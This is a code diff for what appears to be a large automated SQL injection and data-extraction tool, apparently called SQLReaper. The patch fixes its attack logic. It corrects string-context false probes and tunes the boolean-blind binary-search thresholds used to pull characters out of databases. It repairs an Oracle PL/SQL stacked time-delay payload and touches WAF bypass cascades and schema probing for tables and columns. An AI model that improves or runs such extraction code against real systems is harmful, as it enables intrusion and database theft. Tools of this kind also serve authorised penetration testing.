@@ -19321,6 +19321,19 @@ re = _re  # FIX-BUG-RE-ALIAS: 769 sites use bare re.XXX; without this alias they
           # Adding `re = _re` exposes the same module object under the unaliased name
           # so both `re.` and `_re.` forms work correctly throughout the file.
 
+# BUG-SQL-NOISE-PATTERN-RECOMPILE FIX (LOW): apply_sql_noise() previously compiled
+# _NOISE_PATTERN on EVERY call (inside the function body), incurring regex compilation
+# overhead for every injected probe. On high-concurrency scans with thousands of probes
+# per extraction run this adds measurable latency. Fix: compile once at module load time
+# as a module-level constant and reference it inside the function.
+_SQL_NOISE_PATTERN = _re.compile(
+    r'(>=|BETWEEN\s+|THEN\s+|ELSE\s+)'
+    r'(\s*)'
+    r'(\d+)'
+    r'([^.\d]|$)',
+    _re.IGNORECASE
+)
+
 
 # ===============================================================================
 # SQLREAPER V21: ADAPTIVE EXTRACTION ENHANCEMENTS
@@ -38028,7 +38041,18 @@ async def _run_cross_category_probes(
                                 and cat not in ('Boolean', 'B')):
                             try:
                                 _r3d_pay = getattr(result, 'payload', '') or ''
-                                _r3d_false = (" AND 1=2-- -" if "'" in _r3d_pay else " AND 1=2-- -")
+                                # BUG-R3D-FALSE-PAYLOAD-CTX FIX (CRITICAL): Both ternary arms were
+                                # identical (" AND 1=2-- -"), so string-context injections (where
+                                # the payload contains a leading quote) always sent a numeric-context
+                                # false probe — the probe does NOT close the open string literal,
+                                # causing a SQL syntax error on the false probe. The FP pre-check
+                                # then sees: true fires oracle (SQL executes), false fires oracle
+                                # (server returns syntax error matching the oracle), both fire → FP
+                                # guard REJECTS. Real string-context injections were discarded as
+                                # "dynamic page false positive" before PCV ever ran.
+                                # Fix: string-context arm must include the closing quote so the
+                                # probe terminates the string literal before the AND condition.
+                                _r3d_false = ("' AND 1=2-- -" if "'" in _r3d_pay else " AND 1=2-- -")
                                 _r3d_ft = await oracle_fn(_r3d_pay)
                                 _r3d_ff = await oracle_fn(_r3d_false)
                                 if _r3d_ft is not None and _r3d_ff is None:
@@ -43130,8 +43154,15 @@ class Detector:
                         # BUG-V41-1b FIX: was `time.result()` — same typo as above.
                         # `time` is the Python time module; `_t` is the asyncio.Task.
                         gathered.append(_t.result())
-                    except Exception:
-                        pass  # CancelledError after explicit cancel — normal
+                    except BaseException:
+                        # BUG-CANCELLED-DRAIN-BASE-EXCEPTION FIX (MEDIUM): was `except Exception`
+                        # which misses asyncio.CancelledError. Since Python 3.8, CancelledError
+                        # is a subclass of BaseException (not Exception), so the old except clause
+                        # silently re-raised CancelledError out of the drain loop, propagating it
+                        # up the call stack and bypassing any subsequent task teardown.
+                        # Fix: broaden to BaseException so CancelledError (expected after explicit
+                        # cancel) is caught and swallowed here, keeping the drain loop stable.
+                        pass  # CancelledError (BaseException subclass in Python 3.8+) — normal
         except Exception as _aw_exc:
             # Fallback to simple gather on any asyncio.wait error
             # (should only happen for empty _task_objects after the guard above,
@@ -43422,6 +43453,22 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                 if abs(_ei_sim_t - _ei_sim_f) > 0.05:
                     # Calibrate threshold at midpoint of true/false distributions
                     _calib_mid = (_ei_sim_t + _ei_sim_f) / 2.0
+                    # BUG-CALIBRATOR-MODULE-NOT-UPDATED FIX (MEDIUM): _calib_mid was computed
+                    # but never written back to _BOOL_CALIBRATOR_MODULE. The module's internal
+                    # threshold is recalculated from recorded true/false observations via
+                    # record_true()/record_false() → _recalculate(). Without these calls the
+                    # calibrator stays at its default threshold (0.65) regardless of what the
+                    # actual true/false similarity scores show for this target, causing the
+                    # binary-search oracle to misclassify responses when the optimal threshold
+                    # differs from 0.65 (e.g. targets with low body similarity variance where
+                    # the true/false midpoint is 0.82). Fix: record the calibration probe
+                    # similarities so _recalculate() accumulates samples and updates the threshold.
+                    try:
+                        if _BOOL_CALIBRATOR_MODULE is not None:
+                            _BOOL_CALIBRATOR_MODULE.record_true(_ei_sim_t)
+                            _BOOL_CALIBRATOR_MODULE.record_false(_ei_sim_f)
+                    except Exception:
+                        pass  # calibration module update failure is non-fatal
                     # Monkey-patch baseline so _sim_to_baseline comparisons
                     # use a real sample instead of the stub mean/std
                     # BUG-V41-4 FIX: `_ei_fptime` is NOT defined in _extract_int's scope.
@@ -44763,14 +44810,9 @@ def apply_sql_noise(payload: str, request_num: int) -> str:
         #   BETWEEN\s*\d+  — BETWEEN-form comparison pivot
         #   THEN\s*\d+     — CASE branch true-value (1 or 0)
         #   ELSE\s*\d+     — CASE branch false-value (0)
-        _NOISE_PATTERN = _re.compile(
-            r'(>=|BETWEEN\s+|THEN\s+|ELSE\s+)'
-            r'(\s*)'
-            r'(\d+)'
-            r'([^.\d]|$)',
-            _re.IGNORECASE
-        )
-        payload = _NOISE_PATTERN.sub(_add_noise, payload)
+        # BUG-SQL-NOISE-PATTERN-RECOMPILE FIX: use module-level _SQL_NOISE_PATTERN
+        # (compiled once at import) instead of re-compiling on every call.
+        payload = _SQL_NOISE_PATTERN.sub(_add_noise, payload)
     except Exception:
         pass  # noise insertion failure is never fatal; return payload as-is
     return payload
@@ -56000,7 +56042,17 @@ class Scanner:
             # BUG-SAME-ERROR-STATUS-NAMEERROR FIX: initialize before if-elif-else chain;
             # _same_error_status is set in the elif branch but used in the else branch,
             # causing NameError on first iteration when status codes and body lengths match.
-            _same_error_status = False
+            # BUG-SAME-ERROR-STATUS-ELSE-BRANCH FIX (MEDIUM): previously initialized to
+            # False here, then only updated inside the `elif len(_true_body) != len(_false_body)`
+            # branch. When status codes were equal AND body lengths were equal (the `else`
+            # branch), _same_error_status stayed False even when both probes returned the
+            # same error status code. This allowed the hash-based oracle (else branch, lines
+            # ~56081-56124) to fire on matching-length error pages with different hash/SimHash
+            # values — purely because the server returned different error-page variants, not
+            # because SQL drove the difference. Fix: compute the actual guard value here using
+            # the already-available _ts_safe/_fs_safe so ALL branches (if/elif/else) see the
+            # correctly computed value. The elif branch re-assigns the same expression (harmless).
+            _same_error_status = (_ts_safe == _fs_safe and _ts_safe in {400, 403, 406, 412, 429, 430, 500, 503})
 
             # FIX-INFER-STATUS-BOTH-WAF: skip status oracle when BOTH probes return
             # a WAF status code (e.g. true=400 and false=403) — different WAF codes
@@ -57105,7 +57157,11 @@ class Scanner:
             self._bit_shifter = BitShiftExtractor()
             # Pre-build a test bit probe to verify syntax
             _test_bit = BitShiftExtractor.build_bit_probe(_dbms or "MySQL", "VERSION()", 1, 0)
-            _test_char = BitShiftExtractor.bits_to_char([1,0,0,0,0,1,1,0])  # "a"
+            # BUG-BIT-VECTOR-COMMENT FIX (LOW): was [1,0,0,0,0,1,1,0] which is
+            # 0b10000110 = 134 = 0x86 (not 'a'). 'a' is ASCII 97 = 0x61 = 0b01100001.
+            # In MSB-first bit order: [0,1,1,0,0,0,0,1]. Fixed so the test value matches
+            # the comment label, keeping the pre-build syntax check self-documenting.
+            _test_char = BitShiftExtractor.bits_to_char([0,1,1,0,0,0,0,1])  # "a" (0x61=97 MSB-first)
             LOG.debug("[BitShift] Test probe: %s  %r", _test_bit, _test_char)
 
             # DBMS-specific error payloads that embed data in error messages
@@ -80271,6 +80327,14 @@ class ScannerV7(ScannerV6):
                 pass
 
         for tech in ordered_techs:
+            # BUG-V7-DETECT-OUTER-SCAN-STOPPED FIX (MEDIUM): missing top-of-loop stop guard.
+            # Each technique's inner loop already checks _SCAN_STOPPED[0], but without this
+            # outer guard we still call _get_all_category_payloads (non-trivial: dict lookup +
+            # list comprehension) and enter the technique dispatch for every technique even
+            # when the scan was stopped by a concurrent coroutine. Adding the guard here
+            # exits the outer loop immediately on first iteration after stop is set.
+            if _SCAN_STOPPED[0]:
+                return None
             ext_payloads = self._get_all_category_payloads(dbms_hint, cfg.level)  # BUG-FIX-REQ2: ALL 10 categories feed every technique
 
             if tech == "E":
@@ -80306,6 +80370,13 @@ class ScannerV7(ScannerV6):
     async def _v7_error(self, engine, cfg, method, url, data, data_fmt,
                          param, orig, tamper, ext_payloads, dbms_hint, waf_name):
         for payload in ext_payloads:  # Use ALL payloads (get_payloads already limits by level)
+            # BUG-V7-ERROR-SCAN-STOPPED FIX (MEDIUM): missing stop-scan guard inside loop.
+            # Without this check, _v7_error continued sending bypass-variant probes after
+            # _SCAN_STOPPED[0] was set True by a confirmed injection on another coroutine,
+            # generating spurious requests, wasting network budget, and risking false double-
+            # confirmation reports. Fix: honour the module-level stop flag at each iteration.
+            if _SCAN_STOPPED[0]:
+                return None
             # Classic bypass cascade first
             for variant in WAFBypassEngine.apply_cascade(payload, dbms_hint, waf_name, cfg.level)[:2]:
                 r = await self._try_error_payload(engine, method, url, data, data_fmt, param, orig, variant, tamper)
@@ -80344,6 +80415,13 @@ class ScannerV7(ScannerV6):
                            ext_payloads, adapted_bool, dbms_hint, waf_name):
         # Try extended payloads with both bypass layers
         for i in range(0, len(ext_payloads)-1, 2):  # Use ALL payloads (was capped at level*40)
+            # BUG-V7-BOOLEAN-SCAN-STOPPED FIX (MEDIUM): missing stop-scan guard inside loop.
+            # Without this check, _v7_boolean continued issuing true/false probe pairs after
+            # another coroutine confirmed injection and set _SCAN_STOPPED[0]=True, producing
+            # extra network traffic, racing against stat-confirm teardown, and occasionally
+            # returning a stale boolean detection after the scan was logically stopped.
+            if _SCAN_STOPPED[0]:
+                return None
             true_sfx  = ext_payloads[i]
             false_sfx = ext_payloads[i+1] if i+1 < len(ext_payloads) else ""
             if not false_sfx: continue
@@ -80396,6 +80474,13 @@ class ScannerV7(ScannerV6):
         t   = cfg.time_sec
         exp = baseline["mean_timing"] + t * 1000 * 0.75
         for payload in ext_payloads:  # Use ALL payloads (get_payloads already limits by level)
+            # BUG-V7-TIME-SCAN-STOPPED FIX (MEDIUM): missing stop-scan guard inside loop.
+            # Without this check, _v7_time continued sending timing probes after
+            # _SCAN_STOPPED[0] was set True, adding latency from deliberate SLEEP()
+            # calls and risking late-arriving timing detections being erroneously
+            # reported after the scan was logically complete.
+            if _SCAN_STOPPED[0]:
+                return None
             for variant in (WAFBypassEngine.apply_cascade(payload, dbms_hint, waf_name, 2)[:2] +
                             NovelWAFBypass.apply_novel_cascade(payload, dbms_hint, 2)[:1]):
                 try:
@@ -85161,9 +85246,24 @@ class BitwiseExtractor:
                 sim    = SimHasher.body_similarity(self._norm_sample, norm_b)
                 # BUG-BWE-001 FIX: apply polarity inversion so fallback navigates
                 # in the correct direction when WAF blocks TRUE-condition probes.
-                # Normal polarity: sim > THRESH means oracle TRUE (char >= mid+1) → lo = mid+1.
-                # Inverted polarity: sim > THRESH means oracle FALSE (char < mid+1) → hi = mid.
-                _bsf_condition_true = (sim > self.FALLBACK_THRESH) != getattr(self, '_polarity_inverted', False)
+                # Normal polarity: sim >= THRESH means oracle TRUE (char >= mid+1) → lo = mid+1.
+                # Inverted polarity: sim >= THRESH means oracle FALSE (char < mid+1) → hi = mid.
+                # BUG-BEXT-BSFALL-HARDCODED-THRESHOLD FIX (MEDIUM): was `sim > self.FALLBACK_THRESH`
+                # (0.70, hardcoded, strict `>`). Every other SimHash oracle decision in the codebase
+                # reads the adaptive threshold from _BOOL_CALIBRATOR_MODULE.threshold which converges
+                # from real true/false response distributions. On dynamic pages where the calibrated
+                # threshold is below 0.70 (commonly 0.60-0.68), a sim of e.g. 0.65 correctly classifies
+                # TRUE under the calibrator but FALSE under 0.70 — binary search bisects wrong halves
+                # producing incorrect characters. Strict `>` was also inconsistent with `>=` used
+                # elsewhere. Fix: honour adaptive calibrator; fall back to 0.75 on sparse samples.
+                try:
+                    _bsf_thresh = 0.75
+                    _bsf_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                    if _bsf_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                        _bsf_thresh = max(0.60, min(0.85, _bsf_cal))
+                except Exception:
+                    _bsf_thresh = 0.75
+                _bsf_condition_true = (sim >= _bsf_thresh) != getattr(self, '_polarity_inverted', False)
                 if _bsf_condition_true:
                     lo = mid + 1
                 else:
@@ -88972,7 +89072,16 @@ class SchemaInferrer:
                 fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                           result.param, original + payload, tamper_chain)
                 norm_fp = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
-                exists  = SimHasher.body_similarity(norm_base, norm_fp) > 0.78
+                # BUG-SCHEMAINFER-TABLE-HARDCODED-THRESHOLD FIX (MEDIUM): was `> 0.78`
+                # (hardcoded). Same adaptive calibrator fix applied throughout the codebase.
+                try:
+                    _si_tbl_thresh = 0.75
+                    _si_tbl_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                    if _si_tbl_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                        _si_tbl_thresh = max(0.60, min(0.85, _si_tbl_cal))
+                except Exception:
+                    _si_tbl_thresh = 0.75
+                exists  = SimHasher.body_similarity(norm_base, norm_fp) >= _si_tbl_thresh
 
                 if exists:
                     LOG.info(f"  Schema: table {tname!r} exists")
@@ -89067,7 +89176,16 @@ class SchemaInferrer:
                                                data_fmt, result.param,
                                                original + payload, tamper_chain)
                 norm_fp = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
-                if SimHasher.body_similarity(norm_base, norm_fp) > 0.78:
+                # BUG-SCHEMAINFER-COL-HARDCODED-THRESHOLD FIX (MEDIUM): was `> 0.78`
+                # (hardcoded). Same adaptive calibrator fix applied throughout the codebase.
+                try:
+                    _si_col_thresh = 0.75
+                    _si_col_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                    if _si_col_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                        _si_col_thresh = max(0.60, min(0.85, _si_col_cal))
+                except Exception:
+                    _si_col_thresh = 0.75
+                if SimHasher.body_similarity(norm_base, norm_fp) >= _si_col_thresh:
                     found.append(col)
             except Exception as _sqr_e:
                 LOG.debug("Suppressed in _probe_columns: %s", _sqr_e)
@@ -89109,7 +89227,16 @@ class SchemaInferrer:
                 fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                           result.param, original + payload, tamper_chain)
                 norm_fp = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
-                if SimHasher.body_similarity(norm_base, norm_fp) > 0.78:
+                # BUG-SCHEMAINFER-ROWS-HARDCODED-THRESHOLD FIX (MEDIUM): was `> 0.78`
+                # (hardcoded). Same adaptive calibrator fix applied throughout the codebase.
+                try:
+                    _si_row_thresh = 0.75
+                    _si_row_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                    if _si_row_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                        _si_row_thresh = max(0.60, min(0.85, _si_row_cal))
+                except Exception:
+                    _si_row_thresh = 0.75
+                if SimHasher.body_similarity(norm_base, norm_fp) >= _si_row_thresh:
                     lo = mid + 1
                 else:
                     hi = mid
@@ -107021,12 +107148,19 @@ class TechniqueCascadeEngine:
         if not dbms:
             try:
                 _cfg_ipcv = getattr(self, 'config', None)
+                # BUG-INLINE-PCV-DBMS-TERNARY-PRECEDENCE FIX (LOW): Python's ternary
+                # `X if C else Y` has lower precedence than `or`, so the old code parsed as:
+                #   (forced or detected or known or cfg or det.dbms) if det is not None else ''
+                # meaning that when det is None ALL config fallbacks were skipped and dbms
+                # stayed '' — exactly the case when cross-category timing detections fire before
+                # fingerprinting completes and det is None. Fix: wrap only the det-dependent
+                # sub-expression in the ternary so config fallbacks always run.
                 dbms = (
                     (getattr(_cfg_ipcv, 'forced_dbms', None) or '') or
                     (getattr(_cfg_ipcv, '_detected_dbms', None) or '') or
                     (getattr(self, '_known_dbms', None) or '') or
                     (getattr(_cfg_ipcv, 'dbms', None) or '') or
-                    (getattr(det, 'dbms', None) or '') if det is not None else '' or
+                    ((getattr(det, 'dbms', None) or '') if det is not None else '') or
                     ''
                 )
             except Exception:
@@ -109527,12 +109661,19 @@ class TechniqueCascadeEngine:
         if not dbms:
             try:
                 _cfg_ref = getattr(self, 'config', None)
+                # BUG-PCV-LOCKED-DBMS-TERNARY-PRECEDENCE FIX (LOW): same ternary precedence
+                # bug as in _inline_pcv_check. Python parsed:
+                #   (forced or detected or known or cfg or det.dbms) if det is not None else ''
+                # so when det is None all config fallbacks were skipped, leaving dbms=''.
+                # This caused Check E canary selection to fall back to the PostgreSQL probe
+                # for non-PostgreSQL targets, and _is_mssql_cast_bool_e to always be False.
+                # Fix: wrap only the det-dependent sub-expression in the ternary.
                 dbms = (
                     (getattr(_cfg_ref, 'forced_dbms', None) or '') or
                     (getattr(_cfg_ref, '_detected_dbms', None) or '') or
                     (getattr(self, '_known_dbms', None) or '') or
                     (getattr(_cfg_ref, 'dbms', None) or '') or
-                    (getattr(det, 'dbms', None) or '') if det is not None else '' or
+                    ((getattr(det, 'dbms', None) or '') if det is not None else '') or
                     ''
                 )
             except Exception:
@@ -125074,13 +125215,24 @@ class UniversalScanOrchestrator:
                                                             # in the SQL; _cond is placed inside Oracle PL/SQL IF which
                                                             # accepts any boolean comparison expression natively.
                                                             _heavy_n = min(500000, max(100000, int(_ts) * 100000))
+                                                            # BUG-ORACLE-PLSQL-IDENTIFIER-LEADING-UNDERSCORE FIX (HIGH):
+                                                            # Oracle PL/SQL requires unquoted FOR-loop identifiers to start
+                                                            # with a letter (A-Z). `_sqrx__` started with underscore, causing
+                                                            # PLS-00201 compile-time error on ALL Oracle versions (Oracle
+                                                            # compiles the entire anonymous block before executing any of it).
+                                                            # The EXCEPTION fallback was added specifically for pre-12c targets
+                                                            # where DBMS_SESSION.SLEEP does not exist; the compile error made
+                                                            # the fallback silently unreachable, so all Oracle pre-12c stacked
+                                                            # timing probes returned immediately with no delay — the timing
+                                                            # oracle was effectively dead for Oracle <12c. Fix: rename to `sq_r`
+                                                            # (letter-starting, unambiguous, valid in all Oracle versions).
                                                             _pay = (f"{_o}{_ipfx}; "
                                                                     f"BEGIN "
                                                                     f"IF ({_cond}) THEN "
                                                                     f"BEGIN "
                                                                     f"DBMS_SESSION.SLEEP({int(_ts)}); "
                                                                     f"EXCEPTION WHEN OTHERS THEN "
-                                                                    f"FOR _sqrx__ IN (SELECT 1 x FROM all_objects a,all_objects b WHERE ROWNUM<={_heavy_n}) LOOP NULL; END LOOP; "
+                                                                    f"FOR sq_r IN (SELECT 1 x FROM all_objects a,all_objects b WHERE ROWNUM<={_heavy_n}) LOOP NULL; END LOOP; "
                                                                     f"END; "
                                                                     f"END IF; "
                                                                     f"END;-- -")
@@ -146267,7 +146419,20 @@ class MultiChannelExtractor:
                                        ch0["param"], ch0["original"] + payload,
                                        ch0["tamper_chain"])
             self._requests += 1
-            if _sim_to_baseline(fp, ch0["baseline"]) > 0.78:
+            # BUG-MCE-LENGTH-HARDCODED-THRESHOLD FIX (HIGH): was `> 0.78` (hardcoded).
+            # Same root cause as RobustExtractor._probe_bool Bug 1: every other boolean oracle
+            # in the codebase honours _BOOL_CALIBRATOR_MODULE.threshold. On dynamic pages the
+            # calibrated threshold is often 0.60-0.70; a sim of 0.72 is TRUE under the calibrator
+            # but FALSE under 0.78 → binary search always bisects down → extracted length = 0.
+            # Fix: use adaptive calibrator with 0.75 fallback; change `>` to `>=` for consistency.
+            try:
+                _mce_len_thresh = 0.75
+                _mce_len_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                if _mce_len_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                    _mce_len_thresh = max(0.60, min(0.85, _mce_len_cal))
+            except Exception:
+                _mce_len_thresh = 0.75
+            if _sim_to_baseline(fp, ch0["baseline"]) >= _mce_len_thresh:
                 lo = mid + 1
             else:
                 hi = mid
@@ -146320,7 +146485,16 @@ class MultiChannelExtractor:
                                                ch["param"], ch["original"] + payload,
                                                ch["tamper_chain"])
                     self._requests += 1
-                    if _sim_to_baseline(fp, ch["baseline"]) > 0.78:
+                    # BUG-MCE-PIVOT-HARDCODED-THRESHOLD FIX (HIGH): was `> 0.78` (hardcoded).
+                    # Same adaptive calibrator fix as MCE length search above.
+                    try:
+                        _mce_pv_thresh = 0.75
+                        _mce_pv_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                        if _mce_pv_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                            _mce_pv_thresh = max(0.60, min(0.85, _mce_pv_cal))
+                    except Exception:
+                        _mce_pv_thresh = 0.75
+                    if _sim_to_baseline(fp, ch["baseline"]) >= _mce_pv_thresh:
                         lo_c = pivot; break
                 while lo_c < hi_c:
                     # BUG-V165-MCE-CHAR-FIXED-PIVOT FIX (HIGH, all 5 DBMSes;
@@ -146350,7 +146524,16 @@ class MultiChannelExtractor:
                                                ch["param"], ch["original"] + payload,
                                                ch["tamper_chain"])
                     self._requests += 1
-                    if _sim_to_baseline(fp, ch["baseline"]) > 0.78:
+                    # BUG-MCE-CHAR-HARDCODED-THRESHOLD FIX (HIGH): was `> 0.78` (hardcoded).
+                    # Same adaptive calibrator fix as MCE length and pivot searches above.
+                    try:
+                        _mce_ch_thresh = 0.75
+                        _mce_ch_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                        if _mce_ch_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                            _mce_ch_thresh = max(0.60, min(0.85, _mce_ch_cal))
+                    except Exception:
+                        _mce_ch_thresh = 0.75
+                    if _sim_to_baseline(fp, ch["baseline"]) >= _mce_ch_thresh:
                         lo_c = mid_c + 1
                     else:
                         hi_c = mid_c
@@ -149183,7 +149366,19 @@ class ExtractionOrchestrator:
                     else:
                         _baseline_norm = getattr(self, "_m6h_live_baseline", b"")
                     _bl_sim = SimHasher.body_similarity(_baseline_norm, _bl_norm)
-                    if _bl_sim > 0.65:
+                    # BUG-M6H-LEN-HARDCODED-THRESHOLD FIX (MEDIUM): was `> 0.65` (hardcoded).
+                    # 0.65 equals the calibrator default but ignores post-calibration updates.
+                    # When calibration converges to e.g. 0.73, sims 0.65-0.73 are misclassified
+                    # as TRUE (they are below the true/false discriminant). Fix: use adaptive
+                    # calibrator with 0.65 fallback; change `>` to `>=` for boundary correctness.
+                    try:
+                        _m6h_len_thresh = 0.65
+                        _m6h_len_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                        if _m6h_len_cal > 0.55 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                            _m6h_len_thresh = max(0.55, min(0.85, _m6h_len_cal))
+                    except Exception:
+                        _m6h_len_thresh = 0.65
+                    if _bl_sim >= _m6h_len_thresh:
                         _lo = _mid + 1
                     else:
                         _hi = _mid
@@ -149243,7 +149438,16 @@ class ExtractionOrchestrator:
                                 continue
                             _p_norm = ResponseNormaliser.normalise(_extract_body_safe(_p_fp)) if _validate_response(_p_fp, allow_empty=True) else b""
                             _p_sim = SimHasher.body_similarity(_baseline_norm, _p_norm)
-                            if _p_sim > 0.65:
+                            # BUG-M6H-PACKED-HARDCODED-THRESHOLD FIX (MEDIUM): was `> 0.65`
+                            # (hardcoded). Same adaptive calibrator fix as M6H length search above.
+                            try:
+                                _m6h_pk_thresh = 0.65
+                                _m6h_pk_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                                if _m6h_pk_cal > 0.55 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                                    _m6h_pk_thresh = max(0.55, min(0.85, _m6h_pk_cal))
+                            except Exception:
+                                _m6h_pk_thresh = 0.65
+                            if _p_sim >= _m6h_pk_thresh:
                                 _p_lo = _p_mid + 1
                             else:
                                 _p_hi = _p_mid
@@ -149970,7 +150174,23 @@ class RobustExtractor:
                                    self.result.param, self.original + payload,
                                    self.tamper_chain)
         self._requests += 1
-        return _sim_to_baseline(fp, self.baseline) > 0.78
+        # BUG-ROBUST-PROBE-HARDCODED-THRESHOLD FIX (HIGH): was `> 0.78` (hardcoded).
+        # Every other boolean oracle in the codebase reads the adaptive threshold from
+        # _BOOL_CALIBRATOR_MODULE.threshold, which converges from observed true/false
+        # response distributions. On dynamic pages where the calibrated threshold is
+        # below 0.78 (commonly 0.60-0.70), a sim of e.g. 0.72 correctly classifies as
+        # TRUE under the calibrator but as FALSE under 0.78, making every binary search
+        # bisect to the wrong half. Fix: honour the adaptive calibrator; fall back to
+        # 0.75 when insufficient samples are available. Also corrected strict `>` to
+        # `>=` for consistency with all other binary-search oracle decisions in the file.
+        try:
+            _rp_thresh = 0.75
+            _rp_cal = _BOOL_CALIBRATOR_MODULE.threshold
+            if _rp_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                _rp_thresh = max(0.60, min(0.85, _rp_cal))
+        except Exception:
+            _rp_thresh = 0.75
+        return _sim_to_baseline(fp, self.baseline) >= _rp_thresh
 
     async def _extract_hex_char(self, sql: str, pos: int) -> Optional[str]:
         """
@@ -150581,9 +150801,18 @@ class WelchConfirmer:
                               f"(effect={_mt-_mf:.3f} is definitively large)")
                     break
                 # Clear negative: effect is clearly zero or wrong direction
-                if _mt - _mf < -0.05 and len(true_sims) >= 2:
-                    LOG.debug(f"[WelchConfirm] Early-reject after {len(true_sims)} pairs")
-                    return False, 1.0, f"early_reject effect={_mt-_mf:.3f}"
+                # BUG-WELCH-EARLY-REJECT-REVERSED-POLARITY FIX (MEDIUM): the threshold
+                # `-0.05` fired for ANY gap exceeding 5% in the reversed direction after
+                # only 2 pairs. Genuine reversed-polarity injections (WHERE-filtered pages
+                # return smaller TRUE responses than FALSE) produce gaps of 5%-40%; these
+                # were discarded before the Welch t-test could evaluate the full sample.
+                # Fix: align the early-reject threshold with the early-break threshold
+                # (0.40 gap + strong anchoring) so only a definitively wrong-direction
+                # signal is rejected early. Moderate reversed-polarity effects continue
+                # to the t-test which has enough statistical power to classify them.
+                if _mt - _mf < -0.40 and _mf > 0.80 and _mt < 0.60 and len(true_sims) >= 2:
+                    LOG.debug(f"[WelchConfirm] Early-reject (reversed polarity, large effect) after {len(true_sims)} pairs")
+                    return False, 1.0, f"early_reject_reversed effect={_mt-_mf:.3f}"
 
         t_stat, p_val = cls._welch_t(true_sims, false_sims)
         # BUG-WELCH-EMPTY FIX: If scan was stopped mid-loop, true_sims/false_sims may be
@@ -160454,7 +160683,26 @@ class BitwiseExtractorV18(BitwiseExtractor):
                 self._requests += 1
                 norm = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
                 sim  = SimHasher.body_similarity(self._norm_sample, norm)
-                if sim > self.FALLBACK_THRESH:
+                # BUG-BEXTV18-CONTBYTE-HARDCODED-THRESHOLD FIX (MEDIUM): was
+                # `sim > self.FALLBACK_THRESH` (0.70, strict `>`). All other
+                # SimHash-based oracle decisions use the adaptive calibrator threshold
+                # from _BOOL_CALIBRATOR_MODULE.threshold which converges from real
+                # true/false observations. On dynamic pages where the calibrated
+                # threshold is 0.60-0.68, a sim of e.g. 0.65 correctly classifies
+                # TRUE under the calibrator but FALSE under 0.70, producing wrong
+                # continuation bytes and corrupted multi-byte UTF-8 characters
+                # (accented Latin, Greek, Cyrillic, CJK, emoji). Strict `>` was also
+                # inconsistent with `>=` used in all other binary-search decisions.
+                # Fix: honour the adaptive calibrator; fall back to 0.75 when
+                # insufficient samples exist. Changed `>` to `>=` for boundary correctness.
+                try:
+                    _cb_thresh = 0.75
+                    _cb_cal = _BOOL_CALIBRATOR_MODULE.threshold
+                    if _cb_cal > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                        _cb_thresh = max(0.60, min(0.85, _cb_cal))
+                except Exception:
+                    _cb_thresh = 0.75
+                if sim >= _cb_thresh:
                     lo = mid + 1
                 else:
                     hi = mid
